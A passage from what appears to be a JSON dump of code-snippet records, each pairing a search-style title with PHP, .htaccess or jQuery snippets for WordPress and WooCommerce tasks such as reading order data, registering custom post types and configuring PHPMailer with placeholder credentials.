$item->get_product_id();    $variation_id = $item->get_variation_id();    $product = $item->get_product();    $name = $item->get_name();    $quantity = $item->get_quantity();    $subtotal = $item->get_subtotal();    $total = $item->get_total();    $tax = $item->get_subtotal_tax();    $taxclass = $item->get_tax_class();    $taxstat = $item->get_tax_status();    $allmeta = $item->get_meta_data();    $somemeta = $item->get_meta( '_whatever', true );    $type = $item->get_type(); }   // Other Secondary Items Stuff $order->get_items_key(); $order->get_items_tax_classes(); $order->get_item_count(); $order->get_item_total(); $order->get_downloadable_items();    // Get Order Lines $order->get_line_subtotal(); $order->get_line_tax(); $order->get_line_total();    // Get Order Shipping $order->get_shipping_method(); $order->get_shipping_methods(); $order->get_shipping_to_display();    // Get Order Dates $order->get_date_created(); $order->get_date_modified(); $order->get_date_completed(); $order->get_date_paid();    // Get Order User, Billing & Shipping Addresses $order->get_customer_id(); $order->get_user_id(); $order->get_user(); $order->get_customer_ip_address(); $order->get_customer_user_agent(); $order->get_created_via(); $order->get_customer_note(); $order->get_address_prop(); $order->get_billing_first_name(); $order->get_billing_last_name(); $order->get_billing_company(); $order->get_billing_address_1(); $order->get_billing_address_2(); $order->get_billing_city(); $order->get_billing_state(); $order->get_billing_postcode(); $order->get_billing_country(); $order->get_billing_email(); $order->get_billing_phone(); $order->get_shipping_first_name(); $order->get_shipping_last_name(); $order->get_shipping_company(); $order->get_shipping_address_1(); $order->get_shipping_address_2(); $order->get_shipping_city(); $order->get_shipping_state(); $order->get_shipping_postcode(); $order->get_shipping_country(); $order->get_address(); $order->get_shipping_address_map_url(); $order->get_formatted_billing_full_name(); $order->get_formatted_shipping_full_name(); $order->get_formatted_billing_address(); $order->get_formatted_shipping_address();    // Get Order Payment Details $order->get_payment_method(); $order->get_payment_method_title(); $order->get_transaction_id();    // Get Order URLs $order->get_checkout_payment_url(); $order->get_checkout_order_received_url(); $order->get_cancel_order_url(); $order->get_cancel_order_url_raw(); $order->get_cancel_endpoint(); $order->get_view_order_url(); $order->get_edit_order_url();    // Get Order Status $order->get_status(); \n",
    "reg_date": "2021-10-12T10:21:00.000Z"
  },
  {
    "id": 5123,
    "keyword": null,
    "link": null,
    "title": " woocommerce get orders by user id",
    "description": "// Get an instance of the WC_Order object $order = wc_get_order( $order_id );  $order_data = $order->get_data(); // The Order data  $order_id = $order_data['id']; $order_parent_id = $order_data['parent_id']; $order_status = $order_data['status']; $order_currency = $order_data['currency']; $order_version = $order_data['version']; $order_payment_method = $order_data['payment_method']; $order_payment_method_title = $order_data['payment_method_title']; $order_payment_method = $order_data['payment_method']; $order_payment_method = $order_data['payment_method'];  ## Creation and modified WC_DateTime Object date string ##  // Using a formated date ( with php date() function as method) $order_date_created = $order_data['date_created']->date('Y-m-d H:i:s'); $order_date_modified = $order_data['date_modified']->date('Y-m-d H:i:s');  // Using a timestamp ( with php getTimestamp() function as method) $order_timestamp_created = $order_data['date_created']->getTimestamp(); $order_timestamp_modified = $order_data['date_modified']->getTimestamp();  $order_discount_total = $order_data['discount_total']; $order_discount_tax = $order_data['discount_tax']; $order_shipping_total = $order_data['shipping_total']; $order_shipping_tax = $order_data['shipping_tax']; $order_total = $order_data['cart_tax']; $order_total_tax = $order_data['total_tax']; $order_customer_id = $order_data['customer_id']; // ... and so on  ## BILLING INFORMATION:  $order_billing_first_name = $order_data['billing']['first_name']; $order_billing_last_name = $order_data['billing']['last_name']; $order_billing_company = $order_data['billing']['company']; $order_billing_address_1 = $order_data['billing']['address_1']; $order_billing_address_2 = $order_data['billing']['address_2']; $order_billing_city = $order_data['billing']['city']; $order_billing_state = $order_data['billing']['state']; $order_billing_postcode = $order_data['billing']['postcode']; $order_billing_country = $order_data['billing']['country']; $order_billing_email = $order_data['billing']['email']; $order_billing_phone = $order_data['billing']['phone'];  ## SHIPPING INFORMATION:  $order_shipping_first_name = $order_data['shipping']['first_name']; $order_shipping_last_name = $order_data['shipping']['last_name']; $order_shipping_company = $order_data['shipping']['company']; $order_shipping_address_1 = $order_data['shipping']['address_1']; $order_shipping_address_2 = $order_data['shipping']['address_2']; $order_shipping_city = $order_data['shipping']['city']; $order_shipping_state = $order_data['shipping']['state']; $order_shipping_postcode = $order_data['shipping']['postcode']; $order_shipping_country = $order_data['shipping']['country'];\n// Get an instance of the WC_Order object (same as before) $order = wc_get_order( $order_id );  $order_id  = $order->get_id(); // Get the order ID $parent_id = $order->get_parent_id(); // Get the parent order ID (for subscriptions&hellip;)  $user_id   = $order->get_user_id(); // Get the costumer ID $user      = $order->get_user(); // Get the WP_User object  $order_status  = $order->get_status(); // Get the order status  $currency      = $order->get_currency(); // Get the currency used   $payment_method = $order->get_payment_method(); // Get the payment method ID $payment_title = $order->get_payment_method_title(); // Get the payment method title $date_created  = $order->get_date_created(); // Get date created (WC_DateTime object) $date_modified = $order->get_date_modified(); // Get date modified (WC_DateTime object)  $billing_country = $order->get_billing_country(); // Customer billing country  // ... and so on ...\n    public function get_sum_of_paid_orders( int $user_id ): int {          $customer_orders = [];         foreach ( wc_get_is_paid_statuses() as $paid_status ) {             $customer_orders += wc_get_orders( [                 'type'        => 'shop_order',                 'limit'       => - 1,                 'customer_id' => $user_id,                 'status'      => $paid_status,             ] );         }          $total = 0;         foreach ( $customer_orders as $order ) {             $total += $order->get_total();              // your code is here         }          return $total;     } \n",
    "reg_date": "2021-10-12T10:21:00.000Z"
  },
  {
    "id": 5124,
    "keyword": null,
    "link": null,
    "title": " woocommerce get post terms product",
    "description": "$term_obj_list = get_the_terms( $post->ID, 'taxonomy' ); $terms_string = join(', ', wp_list_pluck($term_obj_list, 'name')); \n",
    "reg_date": "2021-10-12T10:21:00.000Z"
  },
  {
    "id": 5125,
    "keyword": null,
    "link": null,
    "title": " woocommerce get product id",
    "description": "// Get Product ID    $product->get_id();    // Get Product General Info    $product->get_type(); $product->get_name(); $product->get_slug(); $product->get_date_created(); $product->get_date_modified(); $product->get_status(); $product->get_featured(); $product->get_catalog_visibility(); $product->get_description(); $product->get_short_description(); $product->get_sku(); $product->get_menu_order(); $product->get_virtual(); get_permalink( $product->get_id() );    // Get Product Prices    $product->get_price(); $product->get_regular_price(); $product->get_sale_price(); $product->get_date_on_sale_from(); $product->get_date_on_sale_to(); $product->get_total_sales();    // Get Product Tax, Shipping & Stock    $product->get_tax_status(); $product->get_tax_class(); $product->get_manage_stock(); $product->get_stock_quantity(); $product->get_stock_status(); $product->get_backorders(); $product->get_sold_individually(); $product->get_purchase_note(); $product->get_shipping_class_id();    // Get Product Dimensions    $product->get_weight(); $product->get_length(); $product->get_width(); $product->get_height(); $product->get_dimensions();    // Get Linked Products    $product->get_upsell_ids(); $product->get_cross_sell_ids(); $product->get_parent_id();    // Get Product Variations and Attributes   $product->get_children(); // get variations $product->get_attributes(); $product->get_default_attributes(); $product->get_attribute( 'attributeid' ); //get specific attribute value    // Get Product Taxonomies    $product->get_categories(); $product->get_category_ids(); $product->get_tag_ids();    // Get Product Downloads    $product->get_downloads(); $product->get_download_expiry(); $product->get_downloadable(); $product->get_download_limit();    // Get Product Images    $product->get_image_id(); $product->get_image(); $product->get_gallery_image_ids();    // Get Product Reviews    $product->get_reviews_allowed(); $product->get_rating_counts(); $product->get_average_rating(); $product->get_review_count(); \nglobal $product; $product->get_id();\n",
    "reg_date": "2021-10-12T10:21:00.000Z"
  },
  {
    "id": 5126,
    "keyword": null,
    "link": null,
    "title": " woocommerce order functions",
    "description": "// Get Order ID and Key $order->get_id(); $order->get_order_key();   // Get Order Totals $0.00 $order->get_formatted_order_total(); $order->get_cart_tax(); $order->get_currency(); $order->get_discount_tax(); $order->get_discount_to_display(); $order->get_discount_total(); $order->get_fees(); $order->get_formatted_line_subtotal(); $order->get_shipping_tax(); $order->get_shipping_total(); $order->get_subtotal(); $order->get_subtotal_to_display(); $order->get_tax_location(); $order->get_tax_totals(); $order->get_taxes(); $order->get_total(); $order->get_total_discount(); $order->get_total_tax(); $order->get_total_refunded(); $order->get_total_tax_refunded(); $order->get_total_shipping_refunded(); $order->get_item_count_refunded(); $order->get_total_qty_refunded(); $order->get_qty_refunded_for_item(); $order->get_total_refunded_for_item(); $order->get_tax_refunded_for_item(); $order->get_total_tax_refunded_by_rate_id(); $order->get_remaining_refund_amount();    // Get and Loop Over Order Items foreach ( $order->get_items() as $item_id => $item ) {    $product_id = $item->get_product_id();    $variation_id = $item->get_variation_id();    $product = $item->get_product();    $name = $item->get_name();    $quantity = $item->get_quantity();    $subtotal = $item->get_subtotal();    $total = $item->get_total();    $tax = $item->get_subtotal_tax();    $taxclass = $item->get_tax_class();    $taxstat = $item->get_tax_status();    $allmeta = $item->get_meta_data();    $somemeta = $item->get_meta( '_whatever', true );    $type = $item->get_type(); }   // Other Secondary Items Stuff $order->get_items_key(); $order->get_items_tax_classes(); $order->get_item_count(); $order->get_item_total(); $order->get_downloadable_items();    // Get Order Lines $order->get_line_subtotal(); $order->get_line_tax(); $order->get_line_total();    // Get Order Shipping $order->get_shipping_method(); $order->get_shipping_methods(); $order->get_shipping_to_display();    // Get Order Dates $order->get_date_created(); $order->get_date_modified(); $order->get_date_completed(); $order->get_date_paid();    // Get Order User, Billing & Shipping Addresses $order->get_customer_id(); $order->get_user_id(); $order->get_user(); $order->get_customer_ip_address(); $order->get_customer_user_agent(); $order->get_created_via(); $order->get_customer_note(); $order->get_address_prop(); $order->get_billing_first_name(); $order->get_billing_last_name(); $order->get_billing_company(); $order->get_billing_address_1(); $order->get_billing_address_2(); $order->get_billing_city(); $order->get_billing_state(); $order->get_billing_postcode(); $order->get_billing_country(); $order->get_billing_email(); $order->get_billing_phone(); $order->get_shipping_first_name(); $order->get_shipping_last_name(); $order->get_shipping_company(); $order->get_shipping_address_1(); $order->get_shipping_address_2(); $order->get_shipping_city(); $order->get_shipping_state(); $order->get_shipping_postcode(); $order->get_shipping_country(); $order->get_address(); $order->get_shipping_address_map_url(); $order->get_formatted_billing_full_name(); $order->get_formatted_shipping_full_name(); $order->get_formatted_billing_address(); $order->get_formatted_shipping_address();    // Get Order Payment Details $order->get_payment_method(); $order->get_payment_method_title(); $order->get_transaction_id();    // Get Order URLs $order->get_checkout_payment_url(); $order->get_checkout_order_received_url(); $order->get_cancel_order_url(); $order->get_cancel_order_url_raw(); $order->get_cancel_endpoint(); $order->get_view_order_url(); $order->get_edit_order_url();    // Get Order Status $order->get_status(); \n",
    "reg_date": "2021-10-12T10:21:00.000Z"
  },
  {
    "id": 5127,
    "keyword": null,
    "link": null,
    "title": " woocommerce order item get product id",
    "description": "// Get an instance of the WC_Order object $order = wc_get_order( $order_id );  $order_data = $order->get_data(); // The Order data  $order_id = $order_data['id']; $order_parent_id = $order_data['parent_id']; $order_status = $order_data['status']; $order_currency = $order_data['currency']; $order_version = $order_data['version']; $order_payment_method = $order_data['payment_method']; $order_payment_method_title = $order_data['payment_method_title']; $order_payment_method = $order_data['payment_method']; $order_payment_method = $order_data['payment_method'];  ## Creation and modified WC_DateTime Object date string ##  // Using a formated date ( with php date() function as method) $order_date_created = $order_data['date_created']->date('Y-m-d H:i:s'); $order_date_modified = $order_data['date_modified']->date('Y-m-d H:i:s');  // Using a timestamp ( with php getTimestamp() function as method) $order_timestamp_created = $order_data['date_created']->getTimestamp(); $order_timestamp_modified = $order_data['date_modified']->getTimestamp();  $order_discount_total = $order_data['discount_total']; $order_discount_tax = $order_data['discount_tax']; $order_shipping_total = $order_data['shipping_total']; $order_shipping_tax = $order_data['shipping_tax']; $order_total = $order_data['cart_tax']; $order_total_tax = $order_data['total_tax']; $order_customer_id = $order_data['customer_id']; // ... and so on  ## BILLING INFORMATION:  $order_billing_first_name = $order_data['billing']['first_name']; $order_billing_last_name = $order_data['billing']['last_name']; $order_billing_company = $order_data['billing']['company']; $order_billing_address_1 = $order_data['billing']['address_1']; $order_billing_address_2 = $order_data['billing']['address_2']; $order_billing_city = $order_data['billing']['city']; $order_billing_state = $order_data['billing']['state']; $order_billing_postcode = $order_data['billing']['postcode']; $order_billing_country = $order_data['billing']['country']; $order_billing_email = $order_data['billing']['email']; $order_billing_phone = $order_data['billing']['phone'];  ## SHIPPING INFORMATION:  $order_shipping_first_name = $order_data['shipping']['first_name']; $order_shipping_last_name = $order_data['shipping']['last_name']; $order_shipping_company = $order_data['shipping']['company']; $order_shipping_address_1 = $order_data['shipping']['address_1']; $order_shipping_address_2 = $order_data['shipping']['address_2']; $order_shipping_city = $order_data['shipping']['city']; $order_shipping_state = $order_data['shipping']['state']; $order_shipping_postcode = $order_data['shipping']['postcode']; $order_shipping_country = $order_data['shipping']['country'];\n// Get an instance of the WC_Order object (same as before) $order = wc_get_order( $order_id );  $order_id  = $order->get_id(); // Get the order ID $parent_id = $order->get_parent_id(); // Get the parent order ID (for subscriptions&hellip;)  $user_id   = $order->get_user_id(); // Get the costumer ID $user      = $order->get_user(); // Get the WP_User object  $order_status  = $order->get_status(); // Get the order status  $currency      = $order->get_currency(); // Get the currency used   $payment_method = $order->get_payment_method(); // Get the payment method ID $payment_title = $order->get_payment_method_title(); // Get the payment method title $date_created  = $order->get_date_created(); // Get date created (WC_DateTime object) $date_modified = $order->get_date_modified(); // Get date modified (WC_DateTime object)  $billing_country = $order->get_billing_country(); // Customer billing country  // ... and so on ...\nforeach ( $items as $item ) {     $product_name = $item->get_name();     $product_id = $item->get_product_id();     $product_variation_id = $item->get_variation_id(); }\n",
    "reg_date": "2021-10-12T10:21:01.000Z"
  },
  {
    "id": 5128,
    "keyword": null,
    "link": null,
    "title": " woocommerce php product gallery change to carousel",
    "description": "add_filter( 'woocommerce_single_product_carousel_options', 'cuswoo_update_woo_flexslider_options' ); /**   * Filer WooCommerce Flexslider options - Add Navigation Arrows  */ function cuswoo_update_woo_flexslider_options( $options ) {      $options['directionNav'] = true;      return $options; } \n",
    "reg_date": "2021-10-12T10:21:01.000Z"
  },
  {
    "id": 5129,
    "keyword": null,
    "link": null,
    "title": " woocommerce product image zoom on hover disable",
    "description": "/* Disable zoom on Woocommerce Product Images */  // Append to your child theme's functions.php function remove_image_zoom_support() {     remove_theme_support( 'wc-product-gallery-zoom' ); } add_action( 'wp', 'remove_image_zoom_support', 100 );\n",
    "reg_date": "2021-10-12T10:21:01.000Z"
  },
  {
    "id": 5130,
    "keyword": null,
    "link": null,
    "title": " woocommerce remove add to cart",
    "description": "// functions.php add_filter( 'woocommerce_loop_add_to_cart_link', '__return_false' );\nfunction chiefthemes_remove_addcart() {    $product = get_product();    if ( has_term ( 'category-name', 'product_cat') ) {        remove_action( 'woocommerce_after_shop_loop_item', 'woocommerce_template_loop_add_to_cart' );        remove_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_add_to_cart', 30 );        remove_action( 'woocommerce_simple_add_to_cart', 'woocommerce_simple_add_to_cart', 30 );        remove_action( 'woocommerce_grouped_add_to_cart', 'woocommerce_grouped_add_to_cart', 30 );        remove_action( 'woocommerce_variable_add_to_cart', 'woocommerce_variable_add_to_cart', 30 );        remove_action( 'woocommerce_external_add_to_cart', 'woocommerce_external_add_to_cart', 30 );    } } add_action( 'wp', 'chiefthemes_remove_addcart' ); \nremove_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_add_to_cart');\n",
    "reg_date": "2021-10-12T10:21:01.000Z"
  },
  {
    "id": 5131,
    "keyword": null,
    "link": null,
    "title": " woocommerce search form <?php get search form(); ?>",
    "description": "get_product_search_form()\n",
    "reg_date": "2021-10-12T10:21:01.000Z"
  },
  {
    "id": 5132,
    "keyword": null,
    "link": null,
    "title": " woocommerce show data to cart page",
    "description": "add_filter( \"woocommerce_get_item_data\", \"cs_get_item_data\", 10,2 ); function cs_get_item_data( $data, $cart_item ){   if ( isset( $cart_item['singleFood'] ) ) {     $data[] = array(         'name'    => 'Choosen Custom Food Items',         'value'   => sanitize_text_field( $cart_item['singleFood'] ),       );   }   return $data; } \n",
    "reg_date": "2021-10-12T10:21:01.000Z"
  },
  {
    "id": 5133,
    "keyword": null,
    "link": null,
    "title": " woocommerce update cart price",
    "description": "function before_calculate_totals( $cart_obj ) {  if ( is_admin() && ! defined( 'DOING_AJAX' ) ) {   return;  }  // Iterate through each cart item  foreach( $cart_obj->get_cart() as $key=>$value ) {      if( isset( $value['csCost'] ) ) {     $getPrice = $value['data']->get_price();      $price = $value['csCost'] + $getPrice;      $value['data']->set_price( ( $price ) );    }    if( isset( $value['setCost'] ) ) {     $getPrice = $value['data']->get_price();      $price = $value['setCost'] + $getPrice;      $value['data']->set_price( ( $price ) );    }     } } add_action( 'woocommerce_before_calculate_totals', 'before_calculate_totals', 10, 1 );\n",
    "reg_date": "2021-10-12T10:21:01.000Z"
  },
  {
    "id": 5134,
    "keyword": null,
    "link": null,
    "title": " wordpres get posttype",
    "description": "if ( get_post_type( get_the_ID() ) == 'slug_post_type' ) {     //if is true } \n",
    "reg_date": "2021-10-12T10:21:01.000Z"
  },
  {
    "id": 5135,
    "keyword": null,
    "link": null,
    "title": " wordpress 404 page after migration",
    "description": "# BEGIN WordPress <IfModule mod_rewrite.c> RewriteEngine On RewriteBase / RewriteRule ^index\\.php$ - [L] RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} !-d RewriteRule . /index.php [L] </IfModule> # END WordPress \n",
    "reg_date": "2021-10-12T10:21:02.000Z"
  },
  {
    "id": 5136,
    "keyword": null,
    "link": null,
    "title": " wordpress PHPMailer config",
    "description": "add_action( 'phpmailer_init', 'setup_phpmailer_init' ); function setup_phpmailer_init( $phpmailer ) {     $phpmailer->Host = 'HOSTNAME'; // for example, smtp.mailtrap.io     $phpmailer->Port = 587; // set the appropriate port: 465, 2525, etc.     $phpmailer->Username = 'YOURUSERNAME'; // your SMTP username     $phpmailer->Password = 'YOURPASSWORD'; // your SMTP password     $phpmailer->SMTPAuth = true;     $phpmailer->SMTPSecure = 'tls'; // preferable but optional     $phpmailer->IsSMTP();\n",
    "reg_date": "2021-10-12T10:21:02.000Z"
  },
  {
    "id": 5137,
    "keyword": null,
    "link": null,
    "title": " wordpress activate plugin",
    "description": "// Attempts activation of plugin in a &ldquo;sandbox&rdquo; and redirects on success. activate_plugin( string $plugin, string $redirect = '',                   bool $network_wide = false, bool $silent = false )\n// Activate multiple plugins. activate_plugins( string|string[] $plugins, string $redirect = '',                    bool $network_wide = false, bool $silent = false )\n",
    "reg_date": "2021-10-12T10:21:02.000Z"
  },
  {
    "id": 5138,
    "keyword": null,
    "link": null,
    "title": " wordpress activate plugins",
    "description": "// Attempts activation of plugin in a &ldquo;sandbox&rdquo; and redirects on success. activate_plugin( string $plugin, string $redirect = '',                   bool $network_wide = false, bool $silent = false )\n// Activate multiple plugins. activate_plugins( string|string[] $plugins, string $redirect = '',                    bool $network_wide = false, bool $silent = false )\n",
    "reg_date": "2021-10-12T10:21:02.000Z"
  },
  {
    "id": 5139,
    "keyword": null,
    "link": null,
    "title": " wordpress add jquery script",
    "description": "Here is an example of how your jQuery script  (in wp-content/themes/your-theme/js/your-scrript.js) might look:  jQuery(document).ready(function($) {   $('#nav a').last().addClass('last'); })\nadd_action( 'wp_enqueue_scripts', 'add_my_script' ); function add_my_script() {     wp_enqueue_script(         'your-script', // name your script so that you can attach other scripts and de-register, etc.         get_template_directory_uri() . '/js/your-script.js', // this is the location of your script file         array('jquery') // this array lists the scripts upon which your script depends     ); }\n",
    "reg_date": "2021-10-12T10:21:02.000Z"
  },
  {
    "id": 5140,
    "keyword": null,
    "link": null,
    "title": " wordpress add submenu",
    "description": "add_menu_page('My Custom Page', 'My Custom Page', 'manage_options', 'my-top-level-slug'); add_submenu_page( 'my-top-level-slug', 'My Custom Page', 'My Custom Page',     'manage_options', 'my-top-level-slug'); add_submenu_page( 'my-top-level-slug', 'My Custom Submenu Page', 'My Custom Submenu Page',     'manage_options', 'my-secondary-slug'); \n",
    "reg_date": "2021-10-12T10:21:02.000Z"
  },
  {
    "id": 5141,
    "keyword": null,
    "link": null,
    "title": " wordpress add to cart redirect php",
    "description": "add_filter ('add_to_cart_redirect', 'redirect_to_checkout');  function redirect_to_checkout() {     global $woocommerce;     $checkout_url = $woocommerce->cart->get_checkout_url();     return $checkout_url; }\n",
    "reg_date": "2021-10-12T10:21:02.000Z"
  },
  {
    "id": 5142,
    "keyword": null,
    "link": null,
    "title": " wordpress apply filters",
    "description": "<?php  // The filter callback function. function example_callback( $string, $arg1, $arg2 ) {     // (maybe) modify $string.     return $string; } add_filter( 'example_filter', 'example_callback', 10, 3 );  /*  * Apply the filters by calling the 'example_callback()' function  * that's hooked onto `example_filter` above.  *  * - 'example_filter' is the filter hook.  * - 'filter me' is the value being filtered.  * - $arg1 and $arg2 are the additional arguments passed to the callback. $value = apply_filters( 'example_filter', 'filter me', $arg1, $arg2 );  \n",
    "reg_date": "2021-10-12T10:21:02.000Z"
  },
  {
    "id": 5143,
    "keyword": null,
    "link": null,
    "title": " wordpress base theme child url",
    "description": "<img src=\"<?php echo get_stylesheet_directory_uri(); ?>/images/test.png\" alt=\"\" width=\"\" height=\"\" /> \n",
    "reg_date": "2021-10-12T10:21:02.000Z"
  },
  {
    "id": 5144,
    "keyword": null,
    "link": null,
    "title": " wordpress change posts archive",
    "description": "add_action('init', 'post_slug_rewrite');  /* You can change \"blog\" to any slug you prefer.    line 10 and 12. */ function post_slug_rewrite() { \t$args = objectToArray( get_post_type_object('post') );  \t$args['has_archive'] = 'blog'; \t$args['rewrite'] = array( \t\t\t'slug' => 'blog', \t\t\t'with_front' => FALSE, \t);  \tregister_post_type('post', $args); }  function objectToArray( $object ) { \tif( !is_object( $object ) && !is_array( $object ) ) \t{ \t\t\treturn $object; \t}  \tif( is_object( $object ) ) \t{ \t\t\t$object = get_object_vars( $object ); \t}  \treturn array_map('objectToArray', $object); }\n",
    "reg_date": "2021-10-12T10:21:03.000Z"
  },
  {
    "id": 5145,
    "keyword": null,
    "link": null,
    "title": " wordpress change site address",
    "description": "// Add to top of wp-config.php define( 'WP_HOME', 'http://example.com' ); define( 'WP_SITEURL', 'http://example.com' );\n",
    "reg_date": "2021-10-12T10:21:03.000Z"
  },
  {
    "id": 5146,
    "keyword": null,
    "link": null,
    "title": " wordpress change slug programmatically",
    "description": "// Create post object $my_post = array(      'post_title' => 'How to make your diet success',      'post_name' => '7-ways-to-make-succes-Diet', //This is what set      'post_content' => 'my content',      'post_status' => 'publish',      'post_author' => 1,      'post_category' => array(8,39)   );  // Insert the post into the database $post_id = wp_insert_post( $my_post );  //For updates use this: wp_update_post([   \"post_name\" => \"new-slug\",   \"ID\" => $post_id, ]); \n",
    "reg_date": "2021-10-12T10:21:03.000Z"
  },
  {
    "id": 5147,
    "keyword": null,
    "link": null,
    "title": " wordpress check if class exists",
    "description": "      if(class_exists('dbinfo')){           //do something       } \n",
    "reg_date": "2021-10-12T10:21:03.000Z"
  },
  {
    "id": 5148,
    "keyword": null,
    "link": null,
    "title": " wordpress check if page",
    "description": "<?php if (is_page( 'Page Title' ) ):   # Do your stuff endif; ?> \n",
    "reg_date": "2021-10-12T10:21:03.000Z"
  },
  {
    "id": 5149,
    "keyword": null,
    "link": null,
    "title": " wordpress check shortcode exists",
    "description": "<?php  if ( shortcode_exists( 'gallery' ) ) {     // The [gallery] short code exists. }  ?> \n",
    "reg_date": "2021-10-12T10:21:03.000Z"
  },
  {
    "id": 5150,
    "keyword": null,
    "link": null,
    "title": " wordpress check user against user roles",
    "description": "$user = wp_get_current_user(); if ( in_array( 'author', (array) $user->roles ) ) {     //The user has the \"author\" role }\n",
    "reg_date": "2021-10-12T10:21:03.000Z"
  },
  {
    "id": 5151,
    "keyword": null,
    "link": null,
    "title": " wordpress convert non negative",
    "description": "// Convert a value to non-negative integer. absint( mixed $maybeint )\n",
    "reg_date": "2021-10-12T10:21:04.000Z"
  },
  {
    "id": 5152,
    "keyword": null,
    "link": null,
    "title": " wordpress create new post type",
    "description": "/* * Creating a function to create our CPT */   function custom_post_type() {   // Set UI labels for Custom Post Type     $labels = array(         'name'                => _x( 'Movies', 'Post Type General Name', 'twentytwenty' ),         'singular_name'       => _x( 'Movie', 'Post Type Singular Name', 'twentytwenty' ),         'menu_name'           => __( 'Movies', 'twentytwenty' ),         'parent_item_colon'   => __( 'Parent Movie', 'twentytwenty' ),         'all_items'           => __( 'All Movies', 'twentytwenty' ),         'view_item'           => __( 'View Movie', 'twentytwenty' ),         'add_new_item'        => __( 'Add New Movie', 'twentytwenty' ),         'add_new'             => __( 'Add New', 'twentytwenty' ),         'edit_item'           => __( 'Edit Movie', 'twentytwenty' ),         'update_item'         => __( 'Update Movie', 'twentytwenty' ),         'search_items'        => __( 'Search Movie', 'twentytwenty' ),         'not_found'           => __( 'Not Found', 'twentytwenty' ),         'not_found_in_trash'  => __( 'Not found in Trash', 'twentytwenty' ),     );       // Set other options for Custom Post Type           $args = array(         'label'               => __( 'movies', 'twentytwenty' ),         'description'         => __( 'Movie news and reviews', 'twentytwenty' ),         'labels'              => $labels,         // Features this CPT supports in Post Editor         'supports'            => array( 'title', 'editor', 'excerpt', 'author', 'thumbnail', 'comments', 'revisions', 'custom-fields', ),         // You can associate this CPT with a taxonomy or custom taxonomy.          'taxonomies'          => array( 'genres' ),         /* A hierarchical CPT is like Pages and can have         * Parent and child items. A non-hierarchical CPT         * is like Posts.         */          'hierarchical'        => false,         'public'              => true,         'show_ui'             => true,         'show_in_menu'        => true,         'show_in_nav_menus'   => true,         'show_in_admin_bar'   => true,         'menu_position'       => 5,         'can_export'          => true,         'has_archive'         => true,         'exclude_from_search' => false,         'publicly_queryable'  => true,         'capability_type'     => 'post',         'show_in_rest' => true,       );           // Registering your Custom Post Type     register_post_type( 'movies', $args );   }   /* Hook into the 'init' action so that the function * Containing our post type registration is not  * unnecessarily executed.  */   add_action( 'init', 'custom_post_type', 0 );\n/* - The function you want for creating a custom wordpress post type is  register_post_type() - https://developer.wordpress.org/reference/functions/register_post_type/ - To add more meta boxes to the post type search for the support items in the  above link. - Below is a basic implementation of the function to register video post type */ register_post_type( 'video',   array(     'labels' => array(       'name' => 'Videos',       'singular_name' => 'Video'     ),     'public' => true,     'has_archive' => true,     'rewrite' => array(       'slug' => 'videos'     ),     'exclude_from_search'=> true     ,     'supports' => array(       'title','editor','thumbnail'     )   ) );\nfunction custom_post_type() {      $labels = array(         'name'                => _x( 'Movies', 'Post Type General Name', 'twentythirteen' ),         'singular_name'       => _x( 'Movie', 'Post Type Singular Name', 'twentythirteen' ),         'menu_name'           => __( 'Movies', 'twentythirteen' ),         'parent_item_colon'   => __( 'Parent Movie', 'twentythirteen' ),         'all_items'           => __( 'All Movies', 'twentythirteen' ),         'view_item'           => __( 'View Movie', 'twentythirteen' ),         'add_new_item'        => __( 'Add New Movie', 'twentythirteen' ),         'add_new'             => __( 'Add New', 'twentythirteen' ),         'edit_item'           => __( 'Edit Movie', 'twentythirteen' ),         'update_item'         => __( 'Update Movie', 'twentythirteen' ),         'search_items'        => __( 'Search Movie', 'twentythirteen' ),         'not_found'           => __( 'Not Found', 'twentythirteen' ),         'not_found_in_trash'  => __( 'Not found in Trash', 'twentythirteen' ),     );                 $args = array(         'label'               => __( 'movies', 'twentythirteen' ),         'description'         => __( 'Movie news and reviews', 'twentythirteen' ),         'labels'              => $labels,         'supports'            => array( 'title', 'editor', 'excerpt', 'author', 'thumbnail', 'comments', 'revisions', 'custom-fields', ),         'hierarchical'        => true,         'public'              => true,         'show_ui'             => true,         'show_in_menu'        => true,         'show_in_nav_menus'   => true,         'show_in_admin_bar'   => true,         'menu_position'       => 5,         'can_export'          => true,         'has_archive'         => true,         'exclude_from_search' => false,         'publicly_queryable'  => true,         'capability_type'     => 'page',         'show_in_rest'        => true,                   // This is where we add taxonomies to our CPT         'taxonomies'          => array( 'category' ),     );           // Registering your Custom Post Type     register_post_type( 'movies', $args );   }    add_action( 'init', 'custom_post_type', 0 ); \nfunction create_posttype() {   register_post_type( 'wpll_product',     array(       'labels' => array(         'name' => __( 'Products' ),         'singular_name' => __( 'Product' )       ),       'public' => true,       'has_archive' => true,       'rewrite' => array('slug' => 'products'),     )   ); } add_action( 'init', 'create_posttype' ); \n// Register Custom Post Type function custom_post_type() {  \t$labels = array( \t\t'name'                  => _x( 'Post Types', 'Post Type General Name', 'text_domain' ), \t\t'singular_name'         => _x( 'Post Type', 'Post Type Singular Name', 'text_domain' ), \t\t'menu_name'             => __( 'Post Types', 'text_domain' ), \t\t'name_admin_bar'        => __( 'Post Type', 'text_domain' ), \t\t'archives'              => __( 'Item Archives', 'text_domain' ), \t\t'attributes'            => __( 'Item Attributes', 'text_domain' ), \t\t'parent_item_colon'     => __( 'Parent Item:', 'text_domain' ), \t\t'all_items'             => __( 'All Items', 'text_domain' ), \t\t'add_new_item'          => __( 'Add New Item', 'text_domain' ), \t\t'add_new'               => __( 'Add New', 'text_domain' ), \t\t'new_item'              => __( 'New Item', 'text_domain' ), \t\t'edit_item'             => __( 'Edit Item', 'text_domain' ), \t\t'update_item'           => __( 'Update Item', 'text_domain' ), \t\t'view_item'             => __( 'View Item', 'text_domain' ), \t\t'view_items'            => __( 'View Items', 'text_domain' ), \t\t'search_items'          => __( 'Search Item', 'text_domain' ), \t\t'not_found'             => __( 'Not found', 'text_domain' ), \t\t'not_found_in_trash'    => __( 'Not found in Trash', 'text_domain' ), \t\t'featured_image'        => __( 'Featured Image', 'text_domain' ), \t\t'set_featured_image'    => __( 'Set featured image', 'text_domain' ), \t\t'remove_featured_image' => __( 'Remove featured image', 'text_domain' ), \t\t'use_featured_image'    => __( 'Use as featured image', 'text_domain' ), \t\t'insert_into_item'      => __( 'Insert into item', 'text_domain' ), \t\t'uploaded_to_this_item' => __( 'Uploaded to this item', 'text_domain' ), \t\t'items_list'            => __( 'Items list', 'text_domain' ), 